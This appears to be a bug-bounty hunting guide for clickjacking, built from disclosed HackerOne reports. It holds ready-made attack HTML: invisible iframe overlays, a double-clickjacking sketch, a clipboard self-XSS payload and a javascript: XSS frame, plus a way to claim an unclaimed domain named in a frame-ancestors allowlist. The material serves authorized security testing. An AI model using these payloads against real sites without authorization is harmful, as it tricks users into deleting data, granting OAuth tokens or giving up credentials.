---
name: hunt-clickjacking
description: "Powerful hunting skill for Clickjacking / UI redressing, built from 147 FULL disclosed HackerOne report texts (157-report corpus). Covers classic missing X-Frame-Options / CSP frame-ancestors, ALLOW-FROM deprecation in Chrome/Safari (XFO ignored → fully frameable), CSP frame-ancestors allowlisted-domain takeover (claim an unclaimed/NXDOMAIN ancestor), double-clickjacking that defeats XFO entirely, and high-value chains — OAuth/SSO consent redressing, self-XSS + framing, clipboard-write self-XSS injection, session-recording payloads, and Bypass-XFO via trusted framing intermediaries. Header absence is only an investigation trigger: confirm the page actually renders in a real browser AND a sensitive state-changing action survives the cross-site context (SameSite cookies, framebusting JS, CSP, and top-window checks can each defeat it). Use when hunting any state-changing HTML page — login, transfer, settings, delete/disable, OAuth authorize, admin."
sources: hackerone_public, public_research, portswigger_research
report_count: 157
full_reports_read: 147
---

## Crown Jewel Targets

Clickjacking (UI Redressing) is highest-value when the framed page performs a **state-changing action with a single click** while the victim is authenticated and the session cookie rides along cross-site. A read-only marketing page missing XFO is documentation noise; a framed "Authorize", "Delete", "Transfer", or "Change email" button is a report. The 147 full reports show the same crown-jewel surfaces recurring — these are where to point the iframe first:

- **OAuth / SSO consent screens** — `/oauth/authorize`, `login.mailchimp.com/oauth2/authorize`, `cas.*.com`, `sso.*`, social-login "Authorize app" dialogs. Confirmed in Coinbase #65825 ($5,000), WakaTime #3287060 (double-clickjacking), Stripo/MailChimp #737625, Khan Academy #639682, Acronis #971234, Semrush #299009, Cloudflare partners #106362. One click grants the attacker's app a token or captures Google credentials.
- **Account settings & authenticated dashboards** — `/account`, `/settings`, `/dashboard/account`, privacy settings, email/password change, 2FA disable. Confirmed in refer.wordpress.com #765355 (modify account details), Gener8 #783191 (change email), m.imgur.com settings #103178 (privacy change), app.lemlist.com #1574017, wakatime share/embed #244967.
- **Destructive / role-changing actions** — "Delete account", "Delete my application", "Remove photo", "Deactivate account", "change role", "follow/unfollow", "bookmark". Confirmed in TikTok #1416612 (delete developer app), Yelp #201848 (remove profile photo), Mail.ru #675614 (delete avatar), UPchieve #1301113 (deactivate), Respondly #7924 (change role), Yelp #965141 (remove review), Yelp #228295 (bookmark).
- **Admin / internal panels** — `admin/users`, `admin.corp.*`, `support-dashboard.corp.*`, debug pages. Confirmed in Rocket.Chat #728004, Cuvva #231434, Cuvva #231694, Weblate #225555, Shipt #389145. These are high-severity because the victim is often a privileged user.
- **Money / payment flows** — donation checkout, `vkpay`, restaurant reservations, "buy items", payment-gateway redirects. Confirmed in WordPress donation #921709 (redirect victim to attacker PayPal), VK #374817, Yelp Reservations #355859 (PII + credit-card misuse), Mail.ru #471967.
- **Login / credential-capture pages** — framed login forms let an attacker overlay a fake UI or force login with attacker credentials → account takeover. Confirmed in Mavenlink #14494/#14631, UPchieve #1400405/#1331485, hakers.upchieve.org #1400405, Top Echelon #2964441.
- **Lead-gen / embed cards and widgets** — Twitter lead-gen cards, image embeds, payment widgets where clicking a button exfiltrates email/username. Confirmed in cards.twitter.com #154963 ("email and username is sent to my domain"), Twitter Periscope #591432, Gratipay #267189.

Severity scales directly with **what the victim is tricked into doing**, and with how privileged the victim is. A framed admin action or OAuth token grant outranks a framed "like" by orders of magnitude. Prioritize pages where: (1) the action is one click, (2) it is state-changing, (3) the victim is logged in, and (4) the cookie is NOT `SameSite=Lax/Strict`.

### Anatomy of a Crown-Jewel Frame

A high-value clickjacking target has four properties, all visible in the disclosed reports:

- **Single-gesture execution** — the whole attack is one click (or two, in double-clickjacking). Reports repeatedly succeed because the sensitive control is a single "Authorize", "Delete", "Remove", "Give once", or "Confirm" button (#1416612, #201848, #921709, #65825). If the action needs a multi-step wizard with CSRF tokens at each stage, redressing is impractical.
- **Authenticated victim + surviving session** — the framed request must carry the victim's identity. Reports stress "if user already logged in it will more sensitive to victim" (#658217) and "the vulnerability exist only for authenticated users" (#244967, #231694). A `SameSite=Lax/Strict` cookie that is withheld cross-site collapses the finding.
- **Irreversible or high-impact outcome** — token grant, data deletion, money movement, credential capture, role change. These are what move a report from "Low / informative" to Medium/High: lemlist #1574017 rated High (CVSS 7.3), Meredith #1221942 rated High, Yelp #355859 CVSS 6.3.
- **No effective frame policy on that specific route** — the header is absent, weak (`ALLOW-FROM`), unsupported in the test browser, or only applied elsewhere on the site. The recurring phrase "the server didn't return an X-Frame-Options header" appears verbatim across dozens of reports (#405342, #1039805, #1176104, #832593, #947690).

### Why "Read-Only" Pages Are Not Crown Jewels

Researchers frequently discover that *every* page on a site is frameable (#1185949 "ALL THE PAGES IN THE WEBSITE IS VULNERABLE", #1039805 with 13 URLs, #405342 with 5). That breadth is useful recon, but a report targeting only the homepage is routinely closed as informative. The winning move is to walk the frameable surface inward until you reach a button that changes state. Treat site-wide framing as a **map of where to look**, not as the finding itself. The exceptions are pages that leak data merely by being framed and clicked — lead-gen cards that send email/username on click (#154963), geo/session-recording overlays (#998555), or SSO login pages that capture typed credentials (#299009, #971234).

---

## Attack Surface Signals

### URL / Path Patterns to Hunt
```
/oauth/authorize            /oauth2/authorize        /authorize
/login                      /signin                  /sso
/account                    /settings                /account/settings
/dashboard                  /admin                   /admin/users
/profile                    /profile/settings        /privacy
/transfer                   /checkout                /donate
/delete                     /remove                  /deactivate
/share/embed                /embed                   /cards
/campaign-settings          /exportservice           /lead_forms_app.php
/support-dashboard          /debug                   /ops
```

### Parameter / Feature Signals (from the 147-report frequency table)
```
iframe-controlled surfaces:  <iframe src=...>         frame / frameset
frame-ancestors policy:      CSP frame-ancestors      ALLOW-FROM (deprecated)
state-change triggers:       ?action=delete           /remove  /follow
redirect-after-action:       ?redirect=               ?next=   ?return_to=
embed/share widgets:         /embed                   ?pub=true&w=540
mobile-specific views:       m.<domain>               /user/<u>/settings
```

### Header Signals (the screening trigger)
```
# ABSENT = candidate (investigate further, do NOT report yet):
X-Frame-Options
Content-Security-Policy: frame-ancestors
# PRESENT but WEAK = still a candidate:
X-Frame-Options: ALLOW-FROM https://twitter.com/   # ignored by Chrome/Safari (#591432, #198622, #658217)
Content-Security-Policy: frame-ancestors 'self' https://*.unclaimed.com:*  # claim that domain (#371980)
# PRESENT and RESTRICTIVE = stop, protected:
X-Frame-Options: DENY | SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none' | 'self'
```

### Client-Side Framebuster Signals (in JS bundles)
```javascript
if (top !== self) { top.location = self.location; }   // classic breakout
if (window !== window.top) document.body.innerHTML = '';
if (self !== top) window.stop();
document.addEventListener('securitypolicyviolation', ...)
// Sec-Fetch-Dest: iframe accepted only for same-origin
```

### Cookie Signals (the exploitability gate)
```
Set-Cookie: session=...; SameSite=Lax    # cross-site framed POST usually NOT sent
Set-Cookie: session=...; SameSite=Strict # never sent cross-site — clickjack fails
Set-Cookie: session=...; SameSite=None; Secure  # rides cross-site → exploitable
Session carried in header / token in URL / non-cookie auth → survives framing
```

### Tech-Stack / Context Signals
- **Site-wide missing XFO** — many reports found *all* pages frameable (#1185949 Sifchain, #1039805 Nextcloud, #832593 Kubernetes, #405342 ylands).
- **Dynamic-content subdomains** — a subdomain with dynamic content and no XFO (#140392), often overlooked while the main app is hardened.
- **Mobile-only vulnerable views** — `m.imgur.com` settings exploitable only with a mobile User-Agent (#103178); test UA switching.
- **Embedded browsers / headless Chrome** — Burp Scanner's embedded Chrome exposed remote debugging via websocket; clickjacking → XSS → RCE (#1274695).
- **Static hosts that cannot set headers** — AWS S3 websites cannot serve security headers, may allow clickjacking (#149572).

### Framing-Friendly Response Patterns (what the raw HTTP looks like)

A candidate response has either no frame directive at all, or a directive that a target browser will not enforce:

```
# Pattern A — nothing (most common)
HTTP/2 200
Content-Type: text/html; charset=utf-8
Set-Cookie: session=...; Path=/; HttpOnly        # no SameSite attribute

# Pattern B — deprecated ALLOW-FROM (ignored by Chrome → frameable)
X-Frame-Options: ALLOW-FROM https://twitter.com/

# Pattern C — CSP allowlist with a domain you can claim
Content-Security-Policy: frame-ancestors 'self' https://*.mod-tools.com:*

# Pattern D — XFO on the main app but NOT on the sensitive subdomain
# (mainapp.example = DENY ; admin.corp.example = no header)
```

### Action-Endpoint Patterns (single-gesture redress targets)

```
/user_photos/{photo_id}/remove     # Yelp photo removal (#201848)
/clips/{id}/delete                 # delete user clips (#1294767)
/dashboard/account                 # email/account change (#783191)
/affiliate-network/campaign-settings  # modify account details (#765355)
/console/calls/user/{follow,unfollow} # one-click follow (#953579)
/oauth/authorize?response_type=code&client_id=...&redirect_uri=...
/share/embed?pub=true&w=540        # framed embed that exfiltrates (#892289, #244967)
```

### Browser-Support Matrix (why "protected in Chrome" is not enough)

| Defense | Chrome | Firefox | Safari / older IE | Hunting implication |
|---------|--------|---------|-------------------|---------------------|
| `X-Frame-Options: DENY` | enforced | enforced | enforced | genuine stop for classic framing |
| `X-Frame-Options: SAMEORIGIN` | enforced | enforced | enforced (top-window semantics vary) | try middle-man top-window chain (#85624) |
| `X-Frame-Options: ALLOW-FROM` | **ignored** | ignored | partially | frame in Chrome (#591432, #198622, #658217) |
| `CSP frame-ancestors` | enforced | enforced | **CSP2 unsupported in older Safari/IE** | frame in legacy browser (#85624) |
| JS framebuster | variable | variable | variable | can be neutralized by sandbox / timing |

---

## Discovery Patterns From 147 Full Reports

### Where Researchers Start (ranked recon surfaces, with what to look for)

1. **Marketing / home page and all public pages** — the cheapest first probe. Researchers drop the homepage URL into an `<iframe>` and watch for rendering (#14631, #222762, #17315, #140392). *What to look for:* any page that renders in a third-party iframe with no XFO and no CSP frame-ancestors. If the whole site is frameable, enumerate inward to a state-changing page (#1185949, #405342, #832593).

2. **Login / authentication endpoints** — the highest-frequency crown jewel. Submit a framed login page and aim to force login with attacker credentials or capture typed secrets (#1400405, #971234, #299009, #14494, #146948, #8459). *What to look for:* `/login`, `/signin`, `/sso`, `/oauth/authorize` that frames cleanly; check whether the session cookie is `SameSite=None` before claiming ATO.

3. **OAuth / SSO consent screens** — increasingly the real prize. Look for "Authorize" / "Connect account" dialogs (#65825, #3287060, #737625, #64946, #639682). *What to look for:* an `authorize` button reachable by a single framed click and a code/token that lands in the attacker's app. Double-clickjacking (#3287060) defeats XFO here entirely.

4. **Account settings / profile pages** — authenticated state-change with 1–2 clicks (#765355, #103178, #261652, #667400, #1198907, #783191). *What to look for:* email/password change, privacy toggles, profile-edit forms; note whether UA-specific (mobile) views are weaker.

5. **Admin / internal subdomains** — `admin.corp.*`, `support-dashboard.corp.*`, `ops.*`, `/admin/users`, debug pages (#728004, #231434, #231694, #225555, #389145). *What to look for:* subdomains omitted from the main app's header policy; "vulnerable only for authenticated users (UI redressing in the Dashboard)".

6. **Destructive action endpoints** — single-click delete/remove/disable/follow (#1416612, #201848, #675614, #1301113, #7924, #965141, #228295, #338569). *What to look for:* a URL that performs an immediate state change on GET or one-click POST (e.g. `/user_photos/{id}/remove`, `/clips`, `developer app delete`).

7. **Embed / share / widget pages** — `/embed`, `/share/embed`, lead-gen cards, payment widgets (#244967, #154963, #892289, #97510, #374817). *What to look for:* pages explicitly designed to be framed (which often means XFO is deliberately absent) — click a button inside and see if data (email, username) is exfiltrated.

8. **Bug-bounty scope recon (subdomain enumeration + public-code-search)** — many findings started from subdomain or code-search discovery (#140392, #2119892, #231694, #1274695, #65624). *What to look for:* forgotten subdomains, dynamic-content hosts, and GitHub/Gist PoCs that reveal the vulnerable endpoint (`sketch.pixiv.net/draw`, `github.com/shifa123/clickjackingpoc`).

9. **Chained XSS / self-XSS inputs** — where a reflected or DOM XSS needs user interaction, clickjacking supplies the interaction (#1171403, #1149144, #953579, #892289, #1221942). *What to look for:* an XSS that "requires user interaction" or is "self-XSS" — ask "can I frame it and force the click/typing?"

10. **Payment / donation / reservation flows** — money-movement endpoints (#921709, #355859, #471967). *What to look for:* a framed "Give once" / booking button whose post-action redirect can be pointed at the attacker's payment gateway.

The recurring meta-pattern in the verbatim clues is opportunistic, not methodical: a researcher tests a page "while performing security testing" (#405342), notices a missing header (#17664), or stumbles on a frameable page while investigating a *different* bug — an XSS that needs interaction (#1171403), a broken authentication flow (#39203), or "internal links treated differently than external links" (#212629). Practical consequence: whenever you are already on the target for another test, fire a cheap iframe probe at every interesting page you touch. Clickjacking is frequently a **secondary finding** discovered during primary hunting.

### Feature-Based Discovery Signals (frequency-ranked, from the full-report corpus)

The mining pass tagged every full report with the techniques it actually contained. These are the real frequencies — use them to prioritize which surfaces to probe first.

| Rank | Signal (reports) | Why It Matters / What to Probe |
|------|------------------|--------------------------------|
| 1 | clickjacking (124) | Core finding. Probe every state-changing HTML page with an iframe PoC in a real browser. |
| 2 | server-side-rendering (46) | Rendered templates/SSR pages are often framed; probe PDF/preview/embed flows for hidden clickable actions. |
| 3 | search-filter-sort (37) | Search/filter UIs are widely framed and often carry "follow", "bookmark", "remove" buttons (#228295, #305128). Probe result-action buttons. |
| 4 | image-processing (23) | Avatar/photo hosts expose remove/delete actions (#675614, #201848). Probe `/user_photos/{id}/remove`, avatar delete. |
| 5 | redirect-handling (15) | After-action redirects can be redirected to attacker pages (#921709, #230581). Probe `?redirect=`, `?next=`. |
| 6 | xml-parser (14) | XML/parser-driven pages (often login/SSO, #971234) framed cleanly. Probe parser-rendered login forms. |
| 7 | csrf (10) | Clickjacking is a CSRF-delivery primitive (#214087, #14494). Probe whether a one-click state change survives framing. |
| 8 | sso-oauth (9) | High-severity consent/token theft (#65825, #299009, #64946). Probe `/oauth/authorize` and SSO login. |
| 9 | public-code-search (8) | Researchers found endpoints via GitHub/Gist (#1274695, #2119892). Search code for target URLs and PoCs. |
| 10 | js-source-review (8) | Framebuster and self-XSS analysis (#953579, #892289). Read JS for `top!==self` and DOM sinks. |
| 11 | admin-internal (8) | Privileged victims (#728004, #231434, #463695). Probe admin/debug subdomains. |
| 12 | api-endpoint (7) | API consoles expose framed actions (#953579, #267189). Probe `/console/*`, `/api` pages. |
| 13 | subdomain-takeover (7) | Weak or unclaimed ancestors/domains (#371980, #2119892). Check CSP allowlist domains for NXDOMAIN. |
| 14 | subdomain (6) | Forgotten subdomains lack headers (#140392, #106362). Enumerate all subdomains. |
| 15 | filter-bypass (6) | ALLOW-FROM ignored, SAMEORIGIN middle-man, CSP ancestor allowlist (#85624, #198622, #371980). Probe weak policies. |
| 16 | open-redirect (6) | Redirect chained to framing (#225555, #230581). Probe post-action redirect parameters. |
| 17 | comment-injection (5) | CSP allowlist unclaimed domain (#371980), mobile settings (#103178). Probe ancestor domain ownership. |
| 18 | cache-layer / debug-error-leak / file-upload / url-fetching (4–5 each) | Info-leak and chained vectors (#998555, #1274695, #1171403). Probe framed pages that leak token/PII. |
| 19 | blind-oob / reflected / base64-encoding (3 each) | Framed reflected XSS and PoC obfuscation (#846430, #1171403, #244697). Probe framed URL parameters. |
| 20 | session-attack / cookie-handling (4 each) | Whether the cookie survives cross-site determines exploitability (#998555, #1221942). Read Set-Cookie. |

Takeaway: classic clickjacking dominates, but the *severity multiplier* lives in the low-frequency rows — SSO/OAuth, admin, subdomain/allowlist takeover, and chained XSS are where the bounties and critical ratings are.

### Verbatim Discovery Clues (18 real `[#id]` quotes)

These are unedited "how I found it" lines from the disclosed reports. They show that discovery is usually opportunistic — a header check, a framed endpoint, or a chained bug — not an exotic exploit.

- [#953579] "Hello i have found a clickjacking vulnerability in https://api."
- [#405342] "While performing security testing of your website i have found the vulnerability called Clickjacking."
- [#892289] "I discovered that have some endpoints that permits to frame imgur."
- [#1171403] "i found an reflected XSS that require user interaction, but it's suspicious due to the reflected payload in the page"
- [#214087] "With the use of iframes in the html document, I was able to discover a clickjacking vulnerabilities on Yelp."
- [#264125] "I found some others endpoints as well which can be Clickjacked easily."
- [#244967] "I found the resource on https://wakatime."
- [#737625] "For this example I saw that where I goto export to MailChimp that page is vulnerable to clickjacking and it is a page where the user enters a username and password..."
- [#163753] "I found that There is a Form for Submitting User Information for applying for Beta Program."
- [#267189] "i found clickjacking URL on https://gratipay."
- [#14631] "Hello , i found clickjacking on main webpage."
- [#17664] "I found out that you have missing X-frame header which allows click jacking in your website"
- [#14494] "com/login) and i found there is click jacking attack and CSRF attack can be done."
- [#1400405] "I found clickjacking at login page on https://hackers."
- [#227837] "I found clickjacking vulnerability while updating business page."
- [#231694] "i found a clickjacking vulnerability in the subdomain of cuvva."
- [#212629] "I discovered this, because I noticed that internal links are treated differently than external links."
- [#97510] "This isn't quite as bad as the previous vulnerability I found, since it requires an additional step (favoriting a tweet) to exploit."

### Probe Checklist (15 concrete probes)

1. `curl -sI <url> | grep -iE 'x-frame-options|content-security-policy'` — confirm both headers are absent or weak.
2. Load the URL in a plain `<iframe src="...">` from a different origin in Chrome — does it actually render, or blank/redirect?
3. Repeat in Firefox and Safari/IE — ALLOW-FROM and CSP2 `frame-ancestors` support differs by browser (#85624, #198622).
4. Check the exact XFO value — `ALLOW-FROM ...` is ignored by Chrome → treat as fully frameable (#591432, #658217, #198622).
5. Parse `frame-ancestors` allowlist — if it names an unregistered/NXDOMAIN domain, claim it and frame (#371980).
6. Read `Set-Cookie` on the framed endpoint — `SameSite=Lax|Strict` likely kills the clickjack; `None; Secure` or token-in-URL survives.
7. Inspect JS for `top!==self`, `window.stop()`, `securitypolicyviolation` — a framebuster can blank the page even with no headers.
8. Frame the **authenticated** version of the page (log in first) — many reports only count on authenticated pages (#244967, #231694).
9. Locate the single sensitive button's coordinates in the rendered frame; build an overlay that aligns the decoy click to it.
10. Verify the state change actually fires from the framed click (account changed, app deleted, token granted) — not just that the page renders.
11. Test the mobile view by switching User-Agent to a mobile browser (#103178, #106362).
12. Enumerate subdomains and admin/debug hosts — the main app may be hardened while `admin.corp.*` is not (#231434, #225555).
13. Check for "action on GET" or one-click POST endpoints (delete/remove/follow/disable) ideal for redressing (#1416612, #201848).
14. If a reflected/DOM XSS exists, try to trigger it through the framed context — "self-XSS + clickjacking" chains (#953579, #892289, #1171403).
15. Test double-clickjacking on OAuth consent screens when XFO appears to block normal framing (#3287060).

---

## Step-by-Step Hunting Methodology

1. **Enumerate the app's HTML surface** — spider the site, list every route that performs a state change, and collect subdomains. Include admin, debug, embed, share, OAuth, and mobile views. Clickjacking is surface-area-driven: the more HTML pages you test, the more likely one is unprotected (#1039805, #1185949).

2. **Screen headers on every candidate** (fast, bulk):
   ```
   for u in $(cat urls.txt); do
     echo "== $u"; curl -sI "$u" | grep -iE 'x-frame-options|content-security-policy' || echo "NO FRAME HEADERS";
   done
   ```
   Treat *absence* or a *weak* value (ALLOW-FROM, permissive frame-ancestors) as a candidate flag — never as a finding.

3. **Triage by sensitivity first** — from the candidate list, rank login, OAuth, settings, destructive, admin, and payment pages above read-only pages. Severity follows the action.

4. **Build a minimal framing harness** and confirm the page renders cross-site:
   ```html
   <!doctype html>
   <iframe src="https://target.example/account/settings"
           style="width:1000px;height:800px;border:0"></iframe>
   ```
   Open from `file://` or a second origin in a real browser. Confirm no framebuster blanks it and no CSP blocks it.

5. **Check the session context** — authenticate in the framed origin, then reload the harness. If the action needs a cookie that is `SameSite=Lax/Strict`, the cross-site frame will be unauthenticated and the clickjack dies. Record the cookie attributes as evidence either way.

6. **Align a decoy overlay to the sensitive control** — position a transparent or opaque iframe over the target button, or use a Burp-generated PoC with `clip-path` / `opacity:0` / `transform-style: preserve-3d` / off-screen `clickjack_focus` input (#1149144, #244697, #201848). The victim sees a benign button but clicks the hidden control.

7. **Prove the state change end-to-end** — click the decoy and show an observable effect: account email changed (#783191), developer app deleted (#1416612), photo removed (#201848), OAuth code delivered to attacker (#3287060), victim redirected to attacker PayPal (#921709). This is the single most important step.

8. **Test browser-specific policies** — ALLOW-FROM is ignored in Chrome (frameable), CSP2 `frame-ancestors` is ignored in older Safari/IE (#85624). A site protected in one browser may be exploitable in another.

9. **Look for chained impact** — if the framed page reflects a parameter, try self-XSS/DOM-XSS triggering via the frame (#953579, #892289, #1149144). If it is an OAuth consent, capture and exchange the code (#3287060). If a tracking script is present, consider session-recording/geo leakage (#998555).

10. **Attempt bypasses when a header exists** — ALLOW-FROM ignored, SAMEORIGIN via top-window confusion, unclaimed CSP ancestor domain, data: URL framing, double-clickjacking, trusted framing intermediary. (See Bypass Techniques.)

11. **Capture evidence** — screenshot/recording of the framed page rendering, the overlay, and the resulting state change; include the `curl -I` header output and the `Set-Cookie` attributes.

12. **Apply Gate 0** before writing the report — confirm attacker capability, victim loss, and 10-minute reproducibility.

### Methodology Notes Distilled From the Reports

- **Start with the PoC, then find the impact.** A large share of submissions begin with the generic `<iframe>` template and only afterward identify a sensitive action (#765955, #971234, #405342, #1039805). This is efficient for recon but insufficient for a report — the accepted/escalated reports are the ones that attach a concrete harm (deleted app, changed email, captured token).
- **"The server didn't return an X-Frame-Options header" is the most repeated sentence in the corpus** (#405342, #1039805, #1176104, #832593, #947690, #163753). It is a screening observation. Teams explicitly treat header absence as a configuration hardening item; a report that stops there is closed as informational.
- **The fix is often trivial and frequently incomplete.** Coinbase #65825 was fixed by "ensuring our OAuth-related responses included the same security headers ... as the rest of the site" — the bug was a single route omitted from the policy. WordPress mercantile #264125 was "fixed" then found still live on other endpoints. Always retest sibling routes after a fix.
- **Victim state matters more than page count.** Reports repeatedly qualify the finding as "authenticated users" only (#244967, #231694, #140392). Build your PoC with a logged-in session and show the post-click state.
- **Browser choice is part of the exploit.** Multiple reports only reproduce in a specific browser: Periscope in Chrome because ALLOW-FROM is ignored (#198622), Imgur in Firefox (#892289), mobile views via UA switcher (#103178), legacy Safari/IE for CSP2 gaps (#85624), Firefox 140 for double-clickjacking (#3287060). State the exact browser/UA in your report.
- **Treat XSS-with-interaction as a clickjacking opportunity.** When another tester says "requires user interaction" (#1171403) or "self-XSS" (#892289, #953579), that is an invitation to frame it and supply the interaction.
- **Embed and share features are deliberately frameable.** Widgets like `/share/embed` (#244967) and Twitter player cards (#85624) are designed to be embedded, so XFO is often absent by design. The question is whether a click inside them performs a sensitive action or leaks data.
- **Record everything.** Because many reports are rated low on their own, a clear video/screenshot of the overlay plus the resulting state change is what converts "Low" recommendations into accepted Medium/High findings (#355859, #737625, #892289 all reference PoC videos).

---

## Payload & Detection Patterns

### Minimal Framing Harness (the universal starting PoC)
```html
<!doctype html>
<html><body>
  <h1>Click here to claim your prize</h1>
  <iframe src="https://target.example/account/settings"
          frameborder="0" height="1200" width="1920"></iframe>
</body></html>
```
Countless accepted reports use essentially this template (#765955, #971234, #405342, #1039805). By itself it only proves framing — add a state-change demo for a valid finding.

### Transparent Overlay PoC (opacity)
```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:800px;
           opacity:0.1; z-index:1; }
  .decoy { position:absolute; top:420px; left:440px; z-index:2; }
</style>
<h1>Win a prize — click below</h1>
<button class="decoy">Click me</button>
<iframe src="https://target.example/transfer"></iframe>
```

### Burp Suite "Clickjacking PoC Generator" Pattern (#1149144, #244697, #201848)
```html
<div id="container" style="clip-path:none;clip:auto;overflow:visible;
     position:absolute;left:0;top:0;width:100%;height:100%">
  <!-- Clickjacking PoC Generated by Burp Suite Professional -->
  <input id="clickjack_focus" style="opacity:0;position:absolute;left:-5000px;">
  <div id="clickjack_button" style="opacity:1;transform-style:preserve-3d;
       text-align:center;width:64px;height:21px;z-index:0;background-color:red;
       color:white;position:absolute;left:200px;top:200px;">Click</div>
  <div id="clickjack_complete" style="display:none;transform-style:preserve-3d;
       color:red;text-align:center;">Clickjacking complete</div>
  <iframe src="https://target.example/sensitive-action"
          style="opacity:0;position:absolute;left:0;top:0;width:100%;height:100%"></iframe>
</div>
```

### Sandboxed Frame Variant (when scripts must run inside the frame)
```html
<!-- #688546, #270454: sandbox attributes control what the framed page can do -->
<iframe src="https://app.outpost.co/settings/preferences"
        sandbox="allow-top-navigation allow-same-origin allow-scripts"
        width="500" height="500"></iframe>
<iframe sandbox="allow-scripts allow-forms"
        src="https://app.legalrobot-uat.com/pending-verification"
        width="1000" height="600"></iframe>
```

### Mobile-User-Agent Framing (#103178, #106362)
- Serve the harness with a mobile view of `m.<domain>`/settings page; use a mobile UA (e.g. UCBrowser) in the browser or UA-switcher addon. Mobile pages frequently lack the desktop app's XFO.

### ALLOW-FROM / Deprecated-Header Test
```
Target returns: X-Frame-Options: ALLOW-FROM https://twitter.com/
Result in Chrome: header ignored → page fully frameable (#591432, #198622, #658217)
Action: build the harness in Chrome, not the browser the vendor tested in.
```

### CSP frame-ancestors Allowlist-Takeover Test (#371980)
```
Target returns: content-security-policy: frame-ancestors 'self' https://*.mod-tools.com:*
Recon: dig mod-tools.com  →  status: NXDOMAIN (unclaimed)
Action: register/serve the allowlisted ancestor origin, then frame from it.
```

### Double-Clickjacking Sketch (#3287060)
```
1. Attacker page shows a button that calls window.open(targetOAuthURL) on click.
2. On mousedown (before the click), replace the opener's content / reposition
   so the victim's second click lands on the OAuth "Authorize" button.
3. Traditional XFO/CSP does not block the two-click sequence because the
   target is opened as a top-level window, not framed.
```

### Chained Self-XSS via Clipboard (#892289)
```javascript
// Framed embed page + clipboard write to plant self-XSS payload
setInterval(function(){
  navigator.clipboard.writeText("<<!<script>iframe src=javascript:alert(document.domain)>");
}, 1000);
// Victim is coaxed into pasting into the framed upload field → self-XSS fires.
```

### Header-Absence Screening (one-liner)
```
curl -sI https://target/account/settings | grep -iE 'x-frame-options|content-security-policy'
# no output  → candidate (continue in browser)
# DENY/SAMEORIGIN/frame-ancestors 'none'|'self'  → protected, stop
```

### Detection / Confirmation Checklist (a finding needs all of these)
- [ ] Page renders inside an attacker-origin iframe in a real browser.
- [ ] No framebuster/CSP blanking or redirecting the frame.
- [ ] Sensitive action reachable by the framed click while authenticated.
- [ ] Session survives the cross-site context (cookie SameSite / token check).
- [ ] Observable state change or data exfiltration demonstrated.
- [ ] Screenshot/recording + header output captured.

### Additional PoC Shapes Seen in the Reports

**Frameset variant (#289246):**
```html
<html>
  <frameset cols="25%,*,25%">
    <frame src="https://target.example/">
    <frame src="https://target.example/settings/">
    <frame src="https://target.example/logout">
  </frameset>
</html>
```

**Meta-refresh + visible iframe variant (#921709):**
```html
<meta http-equiv="refresh" content="5">
<h1>THIS PAGE IS VULNERABLE TO CLICKJACKING</h1>
<iframe src="https://target.example/donate/" height="1200" width="1920"></iframe>
```

**Anti-detection / delay-close variant (#14631, #658217):**
```html
<script>
  // Keep the victim on the decoy page long enough to click
  window.onbeforeunload = function(){ return "Do you want to leave?"; };
  function t(e){ window.setTimeout("stop();", 10); }
</script>
```

**Fully invisible full-viewport frame (#1171403):**
```html
<iframe src="https://target.example/path?URL=javascript:alert(document.domain)//%0D%0Ahttps%3A%2F%2Fgoogle.com"
        id="xxx" width="100%" height="100%" style="opacity:0;"></iframe>
<!-- decoy background image positioned to align the hidden control -->
<style>
  body { background-image: url('1.png'); background-repeat: no-repeat; }
  div  { position:absolute; top:200px; left:900px; }
</style>
```

**Lead-gen card / data-exfil frame (#154963):**
```html
<iframe src="https://cards.twitter.com/i/cards/tfw/v1/759046372544741376?cardname=promotion"></iframe>
<!-- Clicking the framed card button posts the victim's email + username to the attacker. -->
```

**Frame-in-frame detection for multi-frame targets (#892289):**
```javascript
var ifr = document.getElementById('ifr');
ifr.onload = function(){
  // Count frames to know which page the victim is on; then target the upload button.
};
// A frame with only one inner frame indicates the beta upload page.
```

### PoC Quality Checklist
- Keep the decoy visually convincing (#1171403 used a background image matching the real legal site).
- Make the hidden iframe large enough to include the target control at its natural coordinates.
- Use `opacity:0` (fully hidden) for the exploit and `opacity:0.1` for a demonstration screenshot.
- Include a visible confirmation element that appears after the click (Burp's `clickjack_complete` div) so triage can see success.
- Ship a short video when the state change is not obvious from a single screenshot (#355859, #892289).

---

## Common Root Causes

1. **No framing policy at all** — the dominant cause (124/147 reports). The page simply omits XFO and CSP frame-ancestors, so any origin can embed it. Many sites are frameable site-wide (#1185949, #1039805, #832593, #405342).

2. **Header set only on some pages / subdomains** — the main app is hardened but login, settings, admin, or a dynamic-content subdomain is not (#231434, #231694, #140392, #264125). Inconsistent policy rollout is the recurring "fix not complete" pattern (#228295: "you people said the clickjacking issue is fixed but i have found another issue").

3. **Reliance on deprecated `ALLOW-FROM`** — `X-Frame-Options: ALLOW-FROM https://twitter.com/` is ignored by Chrome and other browsers, leaving the page effectively unprotected (#591432, #198622, #658217).

4. **CSP2 `frame-ancestors` not universally supported** — older Safari/IE ignore it; a `frame-ancestors 'self'` policy can be bypassed entirely in those browsers (#85624). Protection that depends on a single browser feature is incomplete.

5. **CSP ancestor allowlist with an unclaimed domain** — the policy trusts `https://*.mod-tools.com:*` while `mod-tools.com` is NXDOMAIN; registering it grants an approved ancestor (#371980). Trusting a domain you do not control is a policy hole.

6. **Policy exists but the button is still clickable via double-clickjacking** — two-click sequences on OAuth consent screens bypass XFO/CSP because the target opens as a top-level window (#3287060).

7. **Framebusting JS as the only defense** — `if(top!==self)` checks are incomplete and browser-dependent; if the page still renders with scripts constrained, the clickjack proceeds (#85624, #270454).

8. **Chained interaction-requiring XSS** — a reflected/DOM XSS that "requires user interaction" or is "self-XSS" is not harmless when clickjacking supplies the click/keystrokes (#1171403, #1149144, #953579, #892289, #1221942).

9. **Authenticated sensitive actions with one-click semantics** — delete/remove/disable/follow endpoints reachable by a single click make ideal redress targets (#1416612, #201848, #675614, #1301113, #7924).

10. **Static/legacy hosting that cannot set security headers** — AWS S3 websites cannot serve security headers, leaving hosted content frameable (#149572).

11. **Session cookies that survive cross-site contexts** — `SameSite=None` or token-in-URL auth makes the framed action actually execute; without it the missing header is largely theoretical.

### Root Cause → Detection → Provenance Map

| Root cause | Fast detection | Representative reports |
|------------|----------------|------------------------|
| No frame policy anywhere | `curl -I` shows no XFO/CSP on any route | #1185949, #1039805, #832593, #405342 |
